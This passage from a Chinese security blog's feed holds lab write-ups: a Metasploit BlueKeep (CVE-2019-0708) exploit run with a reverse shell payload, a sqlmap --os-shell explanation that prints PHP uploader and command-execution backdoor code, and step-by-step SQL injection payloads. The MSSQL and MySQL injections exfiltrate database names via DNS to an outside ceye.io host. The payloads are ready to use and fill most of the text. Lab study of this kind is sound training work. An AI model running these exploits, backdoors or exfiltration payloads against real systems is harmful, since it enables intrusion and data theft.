class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</span><br></pre></td></tr></table></figure><p>保存后，在终端输入如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><h4 id="攻击套件准备"><a href="#攻击套件准备" class="headerlink" title="攻击套件准备"></a>攻击套件准备</h4><p>在 <a href="https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ" target="_blank" rel="noopener">代码下载</a> 提取码: mffr，下载代码，解压后，按它们分别放到如下路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb   -&gt;   /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb   -&gt;   //usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb   -&gt;   //usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb   -&gt;   /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>在 <code>kali</code> 的终端，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure><p>进入 <code>metasploit-framework</code></p><p><img src="/images/195bluekeep2.png" alt></p><p>进入后，输入 <code>reload_all</code> 重新加载上一步添加的 <code>bluekeep</code> 模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> RHOSTS 192.168.100.48</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> RPORT 3389</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep4.png" alt></p><p><code>Win7</code> 虚拟机会蓝屏</p><p><img src="/images/195bluekeep12.png" alt></p><p>查阅资料，发现应该是没有设置 <code>payload</code> 的原因。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms10_018_ie_behaviors</span><br><span class="line">show payloads</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep5.png" alt></p><p><img src="/images/195bluekeep6.png" alt></p><p>选择 <code>generic/shell_reverse_tcp</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep13.png" alt></p><p>之后，再执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.100.48</span><br><span class="line"><span class="built_in">set</span> RPORT 3389</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep8.png" alt></p><p>现在可以执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep9.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep10.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep11.png" alt></p><p><em>参考文章</em></p><blockquote><p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p><p><a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/issues/22" target="_blank" rel="noopener">Exploit completed, no session was created</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 打开 &lt;code&gt;Win7&lt;/code&gt; 虚拟机中的远程桌面，利用 &lt;code&gt;Metasploit&lt;/code&gt; 进行 &lt;code&gt;bluekeep(CVE-2019-0708)&lt;/code&gt;漏洞复现。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入测试</title>
    <link href="http://yoursite.com/2019/09/06/stage2-exam/"/>
    <id>http://yoursite.com/2019/09/06/stage2-exam/</id>
    <published>2019-09-06T11:08:46.000Z</published>
    <updated>2019-09-08T14:50:37.300Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL注入测试</p><a id="more"></a><!--export--><!--toc--><ol><li>Mysql 数据库进行 DNSlog 外带数据时，以下错误的是</li></ol><ul><li><input disabled type="checkbox"> 不可以在 Linux 系统中外带数据</li><li><input disabled type="checkbox"> 可以在 windows 系统中外带数据</li><li><input disabled type="checkbox"> 需要 Mysql 设置 secure_file_priv=’’</li><li><input checked disabled type="checkbox"> 需要 Mysql 设置 secure_file_priv=NULL</li></ul><ol start="2"><li>SQL 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE name=&quot;.$name.&quot; and pass=&quot;.$pass.&quot;</span><br></pre></td></tr></table></figure><p>如何登录</p><ul><li><input disabled type="checkbox"> $name设置值为admin’and’1’=’1’，$pass的值为123456</li><li><input disabled type="checkbox"> $name设置值为admin’and’1’=’1，$pass的值为123456</li><li><input checked disabled type="checkbox"> $name设置值为admin’or’1’=’1，$pass的值为123456</li><li><input disabled type="checkbox"> $name设置值为admin’or’1’=’1’，$pass的值为123456</li></ul><ol start="3"><li>在 php + mysql 网站中，sqlmap 的 –os-shell 功能原理？</li></ol><p>简答：通过 mysql 的 into outfile 或者 into dumpfile 功能，向网站目录中写入 php 代码，用来执行系统命令。</p><p>详细原理描述：</p><ol><li>简单流程</li></ol><p><img src="/images/os_shell.jpg" alt></p><p>由图片，可以看到如下几步：</p><p><img src="/images/os_shell.png" alt></p><ol start="2"><li>流量分析：</li></ol><p>主要 http 流量有 4 条，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line"># 根据 @@version_compile_os 首字母判断操作系统</span><br><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x31,451)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- LNMk&amp;Submit=Submit</span><br><span class="line"># 开始写入文件</span><br><span class="line">id=1&apos; LIMIT 0,1 INTO OUTFILE &apos;/var/www/html/hackable/uploads/2.php&apos; LINES TERMINATED BY 0x3c3f7068702-- -&amp;Submit=Submit</span><br></pre></td></tr></table></figure><p>判断操作系统后，开始写入文件，sqlmap 按路径尝试去访问文件 <code>tmpujqbu.php</code>，通过 POST 上传后门文件 <code>tmpbzhga.php</code>。</p><p><img src="/images/os_shell1.jpg" alt></p><ol start="3"><li>文件内容解析</li></ol><p><img src="/images/os_shell2.jpg" alt></p><p><code>tmpujqbu.php</code> 中的内容就是一个简单的文件上传，并且目标文件的权限设置为 0755，注意这个文件生成利用的 <code>LINES TERMINATED BY</code> ，所以前面会带上 SQL 执行的结果。这里就是 <code>admin admin</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tmpujqbu.php</span></span><br><span class="line">admin    admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $dir = $_REQUEST[<span class="string">"uploadDir"</span>];</span><br><span class="line">    <span class="keyword">if</span> (phpversion() &lt; <span class="string">'4.1.0'</span>) &#123;</span><br><span class="line">        $file = $HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        @move_uploaded_file($HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir . <span class="string">"/"</span> . $file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        @move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir . <span class="string">"/"</span> . $file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    @chmod($dir . <span class="string">"/"</span> . $file, <span class="number">0755</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploaded"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;form action="</span> . $_SERVER[<span class="string">"PHP_SELF"</span>] . <span class="string">" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=/var/www/html/hackable/uploads/&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;"</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而 <code>tmpbzhga.php</code> 可以看到就是一个标准用于执行系统命令的后门脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">    $w = shell_exec($c);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    passthru($c);</span><br><span class="line">    $w = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">    $x = popen($c, r);</span><br><span class="line">    $w = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_resource($x)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof($x)) &#123;</span><br><span class="line">            $w.= fread($x, <span class="number">512</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @pclose($x);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">    $w = <span class="keyword">array</span>();</span><br><span class="line">    exec($c, $w);</span><br><span class="line">    $w = join(chr(<span class="number">10</span>) , $w) . chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $w = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span> . $w . <span class="string">"&lt;/pre&gt;"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问并执行 <code>ls</code> 命令。</p><p><img src="/images/os_shell3.jpg" alt></p><h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ol><li><p>原理简述</p><p>通过 MySQL 的 into outfile 和 into dumpfile 向网站目录下写入 php 代码，用来执行系统命令。</p></li><li><p>使用 <code>--os-shell</code> 需要条件</p><ul><li>FILE 权限</li><li>可写的绝对路径</li><li>PHP GPC OFF</li></ul></li><li><p><code>--os-shell</code> 退出后发生什么</p><p>会调用后门脚本删除上传文件后，进行自删除。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL注入测试&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入测试" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>练习14</title>
    <link href="http://yoursite.com/2019/09/04/practice14/"/>
    <id>http://yoursite.com/2019/09/04/practice14/</id>
    <published>2019-09-04T10:48:00.000Z</published>
    <updated>2019-09-09T05:53:39.326Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 利用<code>mssql</code> 数据库的 <code>dnslog</code> 外带数据的方式进行注入，查询出库名表名；利用 <code>mysql</code> 数据库在 <code>windows</code> 系统中 <code>dnslog</code> 外带数据进行注入。</p><a id="more"></a><!--export--><!--toc--><h3 id="Mssql-的-dnslog-外带数据注入"><a href="#Mssql-的-dnslog-外带数据注入" class="headerlink" title="Mssql 的 dnslog 外带数据注入"></a><code>Mssql</code> 的 <code>dnslog</code> 外带数据注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>查总个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select count(name) from master.dbo.sysdatabases );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog10.png" alt></p><p><img src="/images/193dnslog11.png" alt></p><p>查第一个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=1 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog12.png" alt></p><p><img src="/images/193dnslog13.png" alt></p><p>查询第二个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=2 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog15.png" alt></p><p><img src="/images/193dnslog14.png" alt></p><p>全部库名如下图所示：</p><p><img src="/images/193dnslog16.png" alt></p><p>八个库分别为：<code>master</code>，<code>tempdb</code>，<code>model</code>，<code>msdb</code>，<code>ReportServer</code>，<code>aspcms</code>，<code>ReportServerTempDB</code> 和 <code>test</code>。</p><h4 id="查询库-test-中的表名"><a href="#查询库-test-中的表名" class="headerlink" title="查询库 test 中的表名"></a>查询库 <code>test</code> 中的表名</h4><p>先查看个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select count(Name) FROM test.dbo.SysObjects Where XType=&apos;U&apos; );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog8.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C193dnslog9.png" alt></p><p>总共四个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos;);exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog2.png" alt></p><p><img src="/images/193dnslog3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (&apos;emails&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog4.png" alt></p><p><img src="/images/193dnslog5.png" alt></p><p>关于如何取下一个表名，还有一种更巧妙的方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (select top 3 name from test.dbo.SysObjects Where XType=&apos;U&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog6.png" alt></p><p><img src="/images/193dnslog7.png" alt></p><p>可知，这四个表分别为：<code>emails</code>，<code>users</code>，<code>uagents</code> 和 <code>referers</code>。</p><h4 id="查询-users-表中的列名"><a href="#查询-users-表中的列名" class="headerlink" title="查询 users 表中的列名"></a>查询 <code>users</code> 表中的列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog17.png" alt></p><p><img src="/images/193dnslog18.png" alt></p><p>依次执行下面命令，可以查的所有的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p>列名分别为 ：<code>id</code>，<code>username</code> 和 <code>password</code>。</p><p><img src="/images/193dnslog19.png" alt></p><h4 id="使用-xp-subdirs"><a href="#使用-xp-subdirs" class="headerlink" title="使用 xp_subdirs"></a>使用 <code>xp_subdirs</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_subdirs &quot;//&apos; %2b @a %2b &apos;.subdirs.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog20.png" alt></p><p><img src="/images/193dnslog21.png" alt></p><h4 id="使用-xp-fileexist"><a href="#使用-xp-fileexist" class="headerlink" title="使用 xp_fileexist"></a>使用 <code>xp_fileexist</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_fileexist &quot;//&apos; %2b @a %2b &apos;.fileexist.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog23.png" alt></p><p><img src="/images/193dnslog22.png" alt></p><h4 id="使用-xp-cmdshell"><a href="#使用-xp-cmdshell" class="headerlink" title="使用 xp_cmdshell"></a>使用 <code>xp_cmdshell</code></h4><p>现在数据库中打开 <code>xp_cmdshell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog24.png" alt></p><p>先在数据库中执行下面命令，看是否正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);</span><br><span class="line">reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);</span><br><span class="line">reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; + @a + &apos;.cmdshell.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p>我们可以看到执行的结果。</p><p><img src="/images/193dnslog45.png" alt></p><p><img src="/images/193dnslog46.png" alt></p><p>在 <code>Hackbar</code>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;; exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.hackbarcmd.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog47.png" alt></p><p><img src="/images/193dnslog48.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog25.png" alt></p><p><img src="/images/193dnslog26.png" alt></p><h3 id="MySQL-的-dnslog-外带数据注入"><a href="#MySQL-的-dnslog-外带数据注入" class="headerlink" title="MySQL 的 dnslog 外带数据注入"></a><code>MySQL</code> 的 <code>dnslog</code> 外带数据注入</h3><p><code>window</code>下在 <code>phpstudy_pro</code> 中 <code>C:\phpstudy_pro\Extensions\MySQL8.0.12</code> 下的 <code>my.ini</code>中添加：</p><p><code>secure_file_priv=</code> 重启服务。</p><p><img src="/images/193dnslog49.png" alt></p><h4 id="查询库名-1"><a href="#查询库名-1" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog27.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 1,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog28.png" alt></p><h4 id="查询-security-库中的表名"><a href="#查询-security-库中的表名" class="headerlink" title="查询 security 库中的表名"></a>查询 <code>security</code> 库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog43.png" alt></p><p><strong>注</strong>：也可以使用 <code>database()</code> 函数代替 <code>security</code>，不过要记住要先使用命令 <code>use security;</code> 否则会因当前没有使用的数据库造成失败。</p><h4 id="查询-emails-表中列名"><a href="#查询-emails-表中列名" class="headerlink" title="查询 emails 表中列名"></a>查询 <code>emails</code> 表中列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; and table_name = &apos;emails&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog44.png" alt></p><h3 id="sqli-labs-Less-25"><a href="#sqli-labs-Less-25" class="headerlink" title="sqli-labs Less-25"></a><code>sqli-labs Less-25</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 